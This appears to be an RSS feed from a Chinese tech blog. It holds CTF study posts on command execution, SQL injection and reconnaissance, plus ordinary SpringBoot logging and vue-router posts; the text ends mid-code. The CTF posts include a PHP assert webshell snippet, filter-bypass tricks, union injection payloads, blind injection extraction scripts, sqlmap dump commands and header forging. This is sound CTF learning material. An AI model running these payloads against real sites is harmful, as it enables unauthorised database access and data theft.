    <summary type="html">&lt;p&gt;文件上传分为前端验证和后端验证，前端校验即 &lt;code&gt;js&lt;/code&gt; 方式的校验，可通过抓包方式绕过；后端校验是服务器端校验，需上传指定格式文件然后通过指定手段输出文件指令。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://blog.zhengxiangling.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF - 代码执行</title>
    <link href="https://blog.zhengxiangling.com/2021/07/20/CTF-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>https://blog.zhengxiangling.com/2021/07/20/CTF-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
    <published>2021-07-20T08:29:00.000Z</published>
    <updated>2023-11-17T14:27:30.001Z</updated>
    
    <content type="html"><![CDATA[<p>代码执行类的题目，如在指定时间内计算给定方程的数值，方程题一般时间人工计算会超时，只能通过抓取页面内的方程，然后通过代码执行的方式计算好然后提交来解决；或给定一串 <code>php</code> 代码，通过指定变量输入系统指令执行代码获取目录和读取 <code>flag</code> 里的内容。</p><span id="more"></span><h2 id="获取页面信息包"><a href="#获取页面信息包" class="headerlink" title="获取页面信息包"></a>获取页面信息包</h2><ul><li>1.quests包 pip install获取，获取页面信息包</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sess = requests.session()</span><br><span class="line">req = sess.get(url)</span><br></pre></td></tr></table></figure><ul><li>2.通过 re 正则表达式截取内容，通过(.<em>) 即 (.</em>?)匹配</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pattern = <span class="string">&quot;the answer is:(.*)&lt;/br&gt; a=(.*)&lt;/br&gt; b=(.*?)&lt;/br&gt;&quot;</span></span><br><span class="line">result = re.search(pattern, req.text)</span><br></pre></td></tr></table></figure><ul><li>3.然后可获取匹配到值，通过eval()函数计算数值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a, b = <span class="built_in">int</span>(result.group(<span class="number">2</span>)), <span class="built_in">int</span>(result.group(<span class="number">3</span>))</span><br><span class="line">result = <span class="built_in">eval</span>(result.group(<span class="number">1</span>))</span><br><span class="line"><span class="number">4.</span>通过post发送请求获取 答案</span><br><span class="line">data = &#123; <span class="string">&#x27;answer&#x27;</span>: result &#125;</span><br><span class="line">rsp = sess.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(rsp.text)</span><br></pre></td></tr></table></figure><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>如给定一串代码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后通过发送 <code>post</code> 请求传参，传入 <code>phpinfo()</code> 或者系统命令执行相关命令来获取 <code>flag</code>。</p><h3 id="linux中，-amp-和-amp-amp-和-的区别"><a href="#linux中，-amp-和-amp-amp-和-的区别" class="headerlink" title="linux中，&amp;和&amp;&amp;,|和||的区别"></a>linux中，&amp;和&amp;&amp;,|和||的区别</h3><ul><li><p><code>&amp;</code> 表示任务在后台执行，如要在后台运行 <code>redis-server</code>,则有 <code>redis-server &amp;</code></p></li><li><p><code>&amp;&amp;</code> 表示前一条命令执行成功时，才执行后一条命令 ，如 <code>echo &#39;1‘ &amp;&amp; echo &#39;2&#39;</code>    </p></li><li><p><code>|</code> 表示管道，上一条命令的输出，作为下一条命令参数，如 <code>echo &#39;yes&#39; | wc -l</code></p></li><li><p><code>||</code> 表示上一条命令执行失败后，才执行下一条命令，如 <code>cat nofile || echo &quot;fail&quot;</code></p></li><li><p><code>|</code> 被过滤 用换行符 <code>%0a</code></p></li></ul><h3 id="空格绕过技巧"><a href="#空格绕过技巧" class="headerlink" title="空格绕过技巧"></a>空格绕过技巧</h3><p>命令执行时，后台函数可能会过滤掉空格等特殊字符，可通过如下方式绕过过滤</p><ul><li>${IFS} </li><li>&lt; &lt;&gt;</li><li>%09 </li><li>{cat, 1.txt}</li><li>.\</li><li>%CommonProgramFilesL~10,1%</li></ul><h3 id="判断服务器为linux或windows"><a href="#判断服务器为linux或windows" class="headerlink" title="判断服务器为linux或windows"></a>判断服务器为linux或windows</h3><ul><li><code>windows</code> 对大小写不敏感，将 <code>x</code> 改为 <code>X</code>，如果不变，则为 <code>windows</code></li><li><code>windows</code> 查看文件使用指令 <code>type</code>,  </li></ul><h3 id="文件名绕过技巧"><a href="#文件名绕过技巧" class="headerlink" title="文件名绕过技巧"></a>文件名绕过技巧</h3><p>如 <code>flag</code> 文件被绕过，可通过如下方法绕过</p><ul><li><p><code>nl / fl``ag, nl / fl[a-z]g, a=fl;b=ag;nl /$a%b</code></p></li><li><p><code>echo base64字符串 | base64 -d</code> 通过 <code>base64</code> 加密后再解密</p></li><li><p><code>echo cat /flag|base64</code>，<code>echo base64字符串 | base64 -d</code> 通过 <code>base64</code> 加密后再解密</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;代码执行类的题目，如在指定时间内计算给定方程的数值，方程题一般时间人工计算会超时，只能通过抓取页面内的方程，然后通过代码执行的方式计算好然后提交来解决；或给定一串 &lt;code&gt;php&lt;/code&gt; 代码，通过指定变量输入系统指令执行代码获取目录和读取 &lt;code&gt;flag&lt;/code&gt; 里的内容。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CTF -  sql注入</title>
    <link href="https://blog.zhengxiangling.com/2021/07/20/CTF-sql%E6%B3%A8%E5%85%A5/"/>
    <id>https://blog.zhengxiangling.com/2021/07/20/CTF-sql%E6%B3%A8%E5%85%A5/</id>
    <published>2021-07-20T07:26:00.000Z</published>
    <updated>2023-11-17T14:27:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>sql 注入的题目，出现在登录、注册、查询信息类的题目，涉及前端、后端、数据库（mysql）等知识点。</p><span id="more"></span><p>sql注入类别分为：联合注入、报错注入、布尔盲注、时间盲注。</p><h2 id="联合盲注"><a href="#联合盲注" class="headerlink" title="联合盲注"></a>联合盲注</h2><p>联合盲注即通过找注入点，然后通过 <code>union</code> 联合查询语句找到数据库中想要的值，联合查询即保证和前面的select语句有相同字段数，判断select 语句的字段数，order by 判断字段数，查找有多少个库，有多少个表，有什么字段。</p><h3 id="1-判断是否有注入点"><a href="#1-判断是否有注入点" class="headerlink" title="1.判断是否有注入点"></a>1.判断是否有注入点</h3><ul><li>通过单引号 <code>&#39;</code> 判断是否有注入点</li><li>注入点多试以下符号： <code>&#39;</code> <code>&quot;</code> <code>)</code> <code>&#39;)</code></li></ul><h3 id="2-注入点是字符型还是数字型？"><a href="#2-注入点是字符型还是数字型？" class="headerlink" title="2.注入点是字符型还是数字型？"></a>2.注入点是字符型还是数字型？</h3><ul><li><code>id=1 and 1=1和id=1 and 1=2</code> 页面无变化，说明注入点不是整形；如果注入点为整形，则直接加入 <code>sql</code> 注入语句即可</li><li><code>id =1 &#39; and 1=1 %23,  id =1 &#39; and 1=2 %23</code>，说明注入类型为字符</li></ul><h3 id="3-判断输出内容有多少列"><a href="#3-判断输出内容有多少列" class="headerlink" title="3.判断输出内容有多少列"></a>3.判断输出内容有多少列</h3><p>判断字段数 <code>id=&#39;order by 5 -- -&#39;</code>, 如果字段为 <code>5</code> 则输出正常，输入<code>order by 6%23</code> 发现页面错误，说明没有 <code>6</code> 列，输入 <code>5</code> 正确，说明有<code>5</code> 列。</p><h3 id="4-判断显示位"><a href="#4-判断显示位" class="headerlink" title="4.判断显示位"></a>4.判断显示位</h3><p>查看页面显示的字段是第几位，<code>id=&#39;union select 1,2,3,4,5 %23</code>，查看显示数字是第几位</p><h3 id="5-获取所有数据库名"><a href="#5-获取所有数据库名" class="headerlink" title="5.获取所有数据库名"></a>5.获取所有数据库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="string">&#x27;union select 1,2,select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA,4,5%23</span></span><br></pre></td></tr></table></figure><p>得到两个数据库 <code>information_schema, sq01</code></p><h3 id="6-获取表名"><a href="#6-获取表名" class="headerlink" title="6.获取表名"></a>6.获取表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>SQL01<span class="string">&#x27;),3%23</span></span><br></pre></td></tr></table></figure><p>得到表名 <code>users</code></p><h3 id="7-获取列名"><a href="#7-获取列名" class="headerlink" title="7.获取列名"></a>7.获取列名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),3,4,5%23</span></span><br></pre></td></tr></table></figure><h3 id="8-然后根据表名和列名查询想要的数据"><a href="#8-然后根据表名和列名查询想要的数据" class="headerlink" title="8.然后根据表名和列名查询想要的数据"></a>8.然后根据表名和列名查询想要的数据</h3><h3 id="9-sql关键字被过滤的解决方法"><a href="#9-sql关键字被过滤的解决方法" class="headerlink" title="9.sql关键字被过滤的解决方法"></a>9.sql关键字被过滤的解决方法</h3><ul><li>通过将关键字重复写两遍，如<code>select</code> 换为 <code>seselectlect</code></li><li><code>#</code> 被注释 换成 <code>-- -&#39;</code></li><li><code>&#39;</code> 被过滤，换成 <code>%df\</code>:表示中文字符，<code>%df</code> 表示 <code>‘运</code>，或者尝试 <code>%df</code> 然后再加 <code>&#39;</code><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2>当注入点没有提示信息返回，只有and 1=1 或者 1=2不相同提示时，可通过布尔盲注。<br>通过撞字符获取数据库中的 <code>flag</code>。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://url/index.php?id=1&#x27;&quot;</span></span><br><span class="line">chars = <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890!@#$%^&amp;*()&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        payload = url + <span class="string">&quot;and hex(mid((select flag from users),&#123;0&#125;,1))=hex(&#x27;&#123;1&#125;&#x27;) -- -&quot;</span>.<span class="built_in">format</span>(i, char)</span><br><span class="line">        rsp = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;SangFor&quot;</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">            flag = flag + char</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注，当注入点没有其他提示信息返回时，通过布尔盲注也没有信息提示时，但是 and sleep(5) 页面有等待，说明存在时间盲注。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://url/index.php?id=&quot;</span></span><br><span class="line">chars = <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890!@#$%^&amp;*()&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = url + <span class="string">&quot;1&#x27; and if(hex(mid((select flag from users),&#123;0&#125;,1))=hex(&#x27;&#123;1&#125;&#x27;),sleep(3),3) -- -&quot;</span>.<span class="built_in">format</span>(i, char)</span><br><span class="line">            rsp = requests.get(payload, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag +=  char  </span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="通过-sqlmap-工具查询关键信息"><a href="#通过-sqlmap-工具查询关键信息" class="headerlink" title="通过 sqlmap 工具查询关键信息"></a>通过 sqlmap 工具查询关键信息</h2><ul><li>查询数据库，<code>pyhton2 sqlmap.py -u url --dbs</code></li><li>查询表 <code>python2 sqlmap.py -u url -D 数据库名 --tables</code></li><li>查询字段 <code>python2 sqlmap.py -u url -D 数据库名 -T 数据表名 --columns</code></li><li>查询值 <code>python2 sqlmap.py -u url -D 数据库名 -T 数据表名 --dump</code></li><li>绕过字符过滤 <code>python2 sqlmap.py -u url --dbs -t 10 --tamper unmagicquotes.py sqlmap</code></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;sql 注入的题目，出现在登录、注册、查询信息类的题目，涉及前端、后端、数据库（mysql）等知识点。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CTF - 信息收集基础</title>
    <link href="https://blog.zhengxiangling.com/2021/07/20/CTF-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80/"/>
    <id>https://blog.zhengxiangling.com/2021/07/20/CTF-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80/</id>
    <published>2021-07-20T07:02:00.000Z</published>
    <updated>2023-11-17T14:27:30.001Z</updated>
    
    <content type="html"><![CDATA[<p>CTF，即夺旗赛，在网络攻防比赛中通过各种方式找到题目中的flag得到分数的一种比赛。</p><span id="more"></span><h3 id="查看源码搜索flag"><a href="#查看源码搜索flag" class="headerlink" title="查看源码搜索flag"></a>查看源码搜索flag</h3><p>f12查看网页源码，通过源码搜索关键词查看是否有flag</p><h3 id="通过备份文件找，或者网页源代码查看信息。"><a href="#通过备份文件找，或者网页源代码查看信息。" class="headerlink" title="通过备份文件找，或者网页源代码查看信息。"></a>通过备份文件找，或者网页源代码查看信息。</h3><p>如系统内的备份文件 <code>web.rar</code> 获取到应用源码，或者 <code>php</code> 的备份文件。</p><ul><li><code>vim</code> 的备份文件 <code>nginx.conf.swp</code>，</li><li><code>php</code> 常见的备份文件 <code>index.php index.php~ .index.php.swp</code></li></ul><h3 id="使用文件扫描工具"><a href="#使用文件扫描工具" class="headerlink" title="使用文件扫描工具"></a>使用文件扫描工具</h3><p>御剑后台扫描工具：输入要扫描的网址，一般选择 <code>dir</code> 和 <code>php</code>，但是这种扫描对域名不区分大小写。</p><ul><li><p><code>dirsearch</code> 命令行式扫描工具 <code>python dirsearch.py -u ip地址 -e php</code>。</p></li><li><p>如果遍历到了目录文件，可以继续遍历对应目录的所有文件。</p></li><li><p>如果目录遍历没有东西，可以考虑抓包分析报文。</p></li></ul><h3 id="抓包-burpsuit"><a href="#抓包-burpsuit" class="headerlink" title="抓包  burpsuit"></a>抓包  burpsuit</h3><p>通过抓包，分析报文内的信息，有可能 <code>flag</code> 隐藏在 <code>header</code> 的 <code>cookies</code>、<code>session</code>或者 <code>data</code>内，如果有flag相关的明文、base64编码、md5值等，都可以作为待分析的为flag的地方。</p><ul><li><p><code>base64</code> 编码，编码最后的字符有双等号 ==。</p></li><li><p><code>md5</code> 破解常用的网址 <code>somd5.com</code>。<code>md5</code> 破解不了，只能走代码审计，找数据库的<code>password</code></p></li><li><p>提交请求 <code>ip</code> 伪造：<code>x-forwarded-for: 127.0.0.1</code>。</p></li><li><p>报文伪造域名来源 <code>Referer：域名 url</code>。</p></li><li><p>伪造 <code>Cookie</code>，报文 <code>Cookie: isadmin=1</code></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTF，即夺旗赛，在网络攻防比赛中通过各种方式找到题目中的flag得到分数的一种比赛。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://blog.zhengxiangling.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>SpringBoot 使用org.slf4j.Logger 记录日志</title>
    <link href="https://blog.zhengxiangling.com/2020/09/30/SpringBoot-%E4%BD%BF%E7%94%A8org-slf4j-Logger%E8%AE%B0%E5%BD%95%E6%97%A5%E5%BF%97/"/>
    <id>https://blog.zhengxiangling.com/2020/09/30/SpringBoot-%E4%BD%BF%E7%94%A8org-slf4j-Logger%E8%AE%B0%E5%BD%95%E6%97%A5%E5%BF%97/</id>
    <published>2020-09-30T10:13:00.000Z</published>
    <updated>2023-11-17T14:27:30.003Z</updated>
    
    <content type="html"><![CDATA[<p>  我们在本地运行应用程序时，可以通过控制台查看程序运行情况。但我们把应用部署到生产服务器时，或者对应用测试时需要查看程序运行的情况，我们可以把运行的情况记录到日志中，这样我们就可以通过日志查询程序运行的好坏情况，以及方便后续程序出错时找出错误点及时修复。</p><p>  以下是在<code>springboot</code>通过<code>org.slf4j.Logger</code>记录日志,<code>slf4j</code>是<code>springboot</code>默认自带的日志框架，所以不需要在<code>pom</code>文件中引入。</p><h1 id="定义配置"><a href="#定义配置" class="headerlink" title="定义配置"></a>定义配置</h1><p>  首先需要定义日志的配置文件，配置日志的等级、输出格式、输出位置、保存时间、保存大小等。</p><p>   配置文件可以定义在<code>项目路径/src/main/resources/logback.xml</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!-- 日志级别从低到高分为TRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL，如果设置为WARN，则低于WARN的信息都不会输出 --&gt;</span><br><span class="line">&lt;!-- scan:当此属性设置为<span class="literal">true</span>时，配置文档如果发生改变，将会被重新加载，默认值为<span class="literal">true</span> --&gt;</span><br><span class="line">&lt;!-- scanPeriod:设置监测配置文档是否有修改的时间间隔，如果没有给出时间单位，默认单位是毫秒。</span><br><span class="line">                 当scan为<span class="literal">true</span>时，此属性生效。默认的时间间隔为<span class="number">1</span>分钟。 --&gt;</span><br><span class="line">&lt;!-- debug:当此属性设置为<span class="literal">true</span>时，将打印出logback内部日志信息，实时查看logback运行状态。默认值为<span class="literal">false</span>。 --&gt;</span><br><span class="line">&lt;configuration debug=<span class="string">&quot;false&quot;</span> scan=<span class="string">&quot;true&quot;</span> scanPeriod=<span class="string">&quot;30 seconds&quot;</span>&gt;</span><br><span class="line">    &lt;!--    输出到控制台的配置--&gt;</span><br><span class="line">    &lt;appender name=<span class="string">&quot;console_logger&quot;</span> class=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span><br><span class="line">        &lt;encoder class=<span class="string">&quot;ch.qos.logback.classic.encoder.PatternLayoutEncoder&quot;</span>&gt;</span><br><span class="line">            &lt;pattern&gt;%date [%level] [%thread] %logger&#123;<span class="number">80</span>&#125; [%file : %line] %msg%n&lt;/pattern&gt;</span><br><span class="line">        &lt;/encoder&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--日志不会记录比INFO小的日志，TRACE、DEBUG、INFO、WARN、ERROR--&gt;</span><br><span class="line">        &lt;filter class=<span class="string">&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;</span>&gt;</span><br><span class="line">            &lt;level&gt;INFO&lt;/level&gt;</span><br><span class="line">        &lt;/filter&gt;</span><br><span class="line">    &lt;/appender&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--输出到日志文件--&gt;</span><br><span class="line">    &lt;appender name=<span class="string">&quot;project_logger&quot;</span> class=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span><br><span class="line">        &lt;encoder&gt;</span><br><span class="line">            &lt;pattern&gt;%date [%level] [%thread] %logger&#123;<span class="number">26</span>&#125; [%file : %line] %msg%n&lt;/pattern&gt;</span><br><span class="line">        &lt;/encoder&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--日志不会记录比INFO小的日志，TRACE、DEBUG、INFO、WARN、ERROR--&gt;</span><br><span class="line">        &lt;filter class=<span class="string">&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;</span>&gt;</span><br><span class="line">            &lt;level&gt;INFO&lt;/level&gt;</span><br><span class="line">        &lt;/filter&gt;</span><br><span class="line">        &lt;rollingPolicy class=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span><br><span class="line">            &lt;fileNamePattern&gt;project-logs/project-log.%d&#123;yyyy-MM-dd&#125;.log&lt;/fileNamePattern&gt;</span><br><span class="line">            &lt;maxHistory&gt;<span class="number">30</span>&lt;/maxHistory&gt;</span><br><span class="line">            &lt;totalSizeCap&gt;1GB&lt;/totalSizeCap&gt;</span><br><span class="line">        &lt;/rollingPolicy&gt;</span><br><span class="line">    &lt;/appender&gt;</span><br><span class="line"></span><br><span class="line">    &lt;root level=<span class="string">&quot;INFO&quot;</span>&gt;</span><br><span class="line">        &lt;appender-ref ref=<span class="string">&quot;console_logger&quot;</span>/&gt;</span><br><span class="line">        &lt;appender-ref ref=<span class="string">&quot;project_logger&quot;</span>/&gt;</span><br><span class="line">    &lt;/root&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure><h1 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h1><p>定义好配置之后，我们就可以使用了，通过引入和在需要记录的地方使用即可。</p><p>需要注意的地方时，我们在上面配置信息里，定义了记录日志的等级为<code>&lt;level&gt;INFO&lt;/level&gt;</code>，意思是低于<code>INFO</code>等级的记录我们不会记录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义全局日志变量</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(ILogService.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将信息记录到日志中</span></span><br><span class="line"><span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> <span class="string">&quot;记录日志信息&quot;</span>;</span><br><span class="line">logger.info(info);</span><br></pre></td></tr></table></figure><p>然后<code>info</code>的信息，可以在日志文件<code>.log</code>中查看了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  我们在本地运行应用程序时，可以通过控制台查看程序运行情况。但我们把应用部署到生产服务器时，或者对应用测试时需要查看程序运行的情况，我们可以把运行的情况记录到日志中，这样我们就可以通过日志查询程序运行的好坏情况，以及方便后续程序出错时找出错误点及时修复。&lt;/p&gt;
&lt;p&gt; </summary>
      
    
    
    
    
    <category term="java" scheme="https://blog.zhengxiangling.com/tags/java/"/>
    
    <category term="springboot" scheme="https://blog.zhengxiangling.com/tags/springboot/"/>
    
  </entry>
  
  <entry>
    <title>vue-router 拦截用户页面路由访问</title>
    <link href="https://blog.zhengxiangling.com/2020/08/15/vue-router-%E6%8B%A6%E6%88%AA%E7%94%A8%E6%88%B7%E9%A1%B5%E9%9D%A2%E8%B7%AF%E7%94%B1%E8%AE%BF%E9%97%AE/"/>
    <id>https://blog.zhengxiangling.com/2020/08/15/vue-router-%E6%8B%A6%E6%88%AA%E7%94%A8%E6%88%B7%E9%A1%B5%E9%9D%A2%E8%B7%AF%E7%94%B1%E8%AE%BF%E9%97%AE/</id>
    <published>2020-08-15T11:05:00.000Z</published>
    <updated>2023-11-17T14:27:30.007Z</updated>
    
    <content type="html"><![CDATA[<p>在对需要做登录的系统前端页面访问做控制时，可以用<code>router</code>的<code>beforeEach</code>方式来对跳转到的路径做管理。如果访问的路径在路径白名单内，则可以继续访问，如果不在，则判断用户是否登录，如果未登录，则被强制跳转到登录页面。</p><p>一般在前端，用户登录完成之后，我们会将管理用户状态的<code>token</code>值存在Cookie或者session中，所以可以用是否有<code>token</code>值来判断用户是否已经做了登录。</p><p>权限判断逻辑</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// permission.js</span></span><br><span class="line"><span class="comment">// 引入 router</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"><span class="comment">// 引入用户状态管理用的 store</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"><span class="comment">// 引入 Cookies 插件</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Cookies</span> <span class="keyword">from</span> <span class="string">&#x27;js-cookie&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由白名单，访问白名单页面不需要做登录</span></span><br><span class="line"><span class="keyword">const</span> whiteList = [<span class="string">&#x27;/login&#x27;</span>]</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="title function_">async</span>(to, <span class="keyword">from</span>, next) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 获取系统用户 Token，存的 Cookie 名由自己定</span></span><br><span class="line">    <span class="keyword">const</span> hasToken = <span class="title 